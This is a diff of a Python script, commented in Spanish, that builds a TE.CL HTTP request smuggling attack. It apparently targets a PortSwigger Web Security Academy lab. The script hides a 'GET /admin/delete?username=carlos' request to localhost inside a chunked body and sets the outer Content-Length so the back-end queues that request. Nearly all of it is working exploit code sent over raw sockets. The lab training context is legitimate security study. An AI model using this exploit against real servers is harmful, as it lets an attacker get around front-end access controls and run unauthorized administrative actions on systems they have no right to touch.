@@ -1,24 +1,40 @@
 #!/usr/bin/env python3
 """
-Envío de peticiones HTTP crudas por el socket (HTTP y HTTPS).
-Pensado para HTTP request smuggling: NADIE normaliza tus cabeceras.
+HTTP Request Smuggling  ->  TE.CL
+=================================
+Front-end usa Transfer-Encoding, back-end usa Content-Length.
+
+Idea:
+  - El FRONT-END mira Transfer-Encoding: chunked -> lee chunks hasta el "0\r\n\r\n"
+    final, asi que reenvia TODO (incluida la peticion colada dentro del chunk).
+  - El BACK-END mira Content-Length -> lee SOLO esos bytes (la linea del tamano
+    del chunk, p.ej. "5c\r\n" = 4 bytes) y se detiene. El resto (la peticion
+    colada) se queda en su buffer como INICIO de la siguiente peticion.
+
+Estructura del cuerpo:
+    <hex>\r\n                 <- tamano del chunk en HEX. El back-end (CL) solo lee esto.
+    GET /admin/... HTTP/1.1   <- peticion colada, va DENTRO del chunk
+    ...
+    0\r\n                     <- fin de chunks para el front-end (TE)
+    \r\n
+
+Content-Length exterior = longitud de la linea del tamano del chunk (se calcula solo).
 
 Uso:
-    python raw_socket.py
-
-Cambia HOST / PORT / USE_TLS y la variable `request` de abajo.
+    python te_cl.py
+Cambia HOST / PORT / USE_TLS y la peticion colada (smuggled_request).
 """
 import socket
 import ssl
 
-HOST = "0aba007f03e8d22880637bb200a80066.web-security-academy.net"  # <-- tu lab
+HOST = "TU-LAB-ID.web-security-academy.net"  # <-- cambia por tu lab
 PORT = 443
 USE_TLS = True          # True para HTTPS, False para HTTP
-TIMEOUT = 10            # segundos; sube si esperas time-out del smuggling
+TIMEOUT = 10            # segundos; sube si el server se queda esperando
 
 
 def send_raw(host: str, port: int, raw: bytes, use_tls: bool = True,
-             timeout: float = TIMEOUT, read_all: bool = True) -> bytes:
+             timeout: float = TIMEOUT) -> bytes:
     """Abre el socket, envia los bytes EXACTOS y devuelve la respuesta cruda."""
     sock = socket.create_connection((host, port), timeout=timeout)
     if use_tls:
@@ -27,7 +43,6 @@ def send_raw(host: str, port: int, raw: bytes, use_tls: bool = True,
         # ctx.check_hostname = False
         # ctx.verify_mode = ssl.CERT_NONE
         sock = ctx.wrap_socket(sock, server_hostname=host)
-
     try:
         sock.sendall(raw)
         chunks = []
@@ -39,20 +54,16 @@ def send_raw(host: str, port: int, raw: bytes, use_tls: bool = True,
             if not data:
                 break
             chunks.append(data)
-            if not read_all:
-                break
         return b"".join(chunks)
     finally:
         sock.close()
 
 
 # ---------------------------------------------------------------------------
-# La peticion CRUDA. Ojo: cada linea termina en \r\n, y el cuerpo va tras \r\n\r\n
-# Ejemplo clasico de CL.TE (Content-Length vs Transfer-Encoding):
+# Peticion COLADA (la que ejecuta el back-end). Va ENTERA dentro de un chunk.
 # ---------------------------------------------------------------------------
-smuggled_body = (
+smuggled_request = (
     "GET /admin/delete?username=carlos HTTP/1.1\r\n"
-    #f"Host: {HOST}\r\n"
     "Host: localhost\r\n"
     "Content-Type: application/x-www-form-urlencoded\r\n"
     "Content-Length: 15\r\n"
@@ -60,23 +71,22 @@ smuggled_body = (
     "x=1"
 )
 
-# Tamano del chunk = longitud del smuggled_body en HEX (sin 0x)
-chunk_size = format(len(smuggled_body.encode("latin-1")), "x")  # p.ej. "60"
+# Tamano del chunk = longitud de la peticion colada, en HEX (sin 0x). p.ej. "5c"
+chunk_size = format(len(smuggled_request.encode("latin-1")), "x")
+chunk_line = f"{chunk_size}\r\n"     # tal cual viaja por el cable, p.ej. "5c\r\n"
 
-# Linea del tamano del chunk, tal cual viaja por el cable
-chunk_line = f"{chunk_size}\r\n"
-
+# Cuerpo: linea del tamano + peticion colada + cierre de chunks (0).
 body = (
     f"{chunk_line}"
-    f"{smuggled_body}"
+    f"{smuggled_request}"
     "\r\n"
     "0\r\n"
-    "\r\n"                 # <-- lo que sigue se "cuela" en la siguiente peticion
+    "\r\n"
 )
 
-# TE.CL: el back-end usa Content-Length -> debe leer SOLO la linea del tamano del
-# chunk. Por eso CL = longitud de esa linea (incluido su \r\n). Se calcula solo:
-content_length = len(chunk_line.encode("latin-1"))  # "60\r\n" -> 4
+# CL exterior = longitud de la linea del tamano del chunk (incluido su \r\n).
+# Asi el back-end (CL) lee SOLO esa linea y deja colado el resto. Se calcula solo:
+content_length = len(chunk_line.encode("latin-1"))   # "5c\r\n" -> 4
 
 request = (
     f"POST / HTTP/1.1\r\n"
@@ -90,7 +100,7 @@ request = (
 
 
 if __name__ == "__main__":
-    print(f"[*] Conectando a {HOST}:{PORT} (TLS={USE_TLS})")
+    print(f"[*] TE.CL  ->  {HOST}:{PORT} (TLS={USE_TLS})")
     print("[*] Peticion enviada:\n" + "-" * 40)
     print(request.decode("latin-1"))
     print("-" * 40)
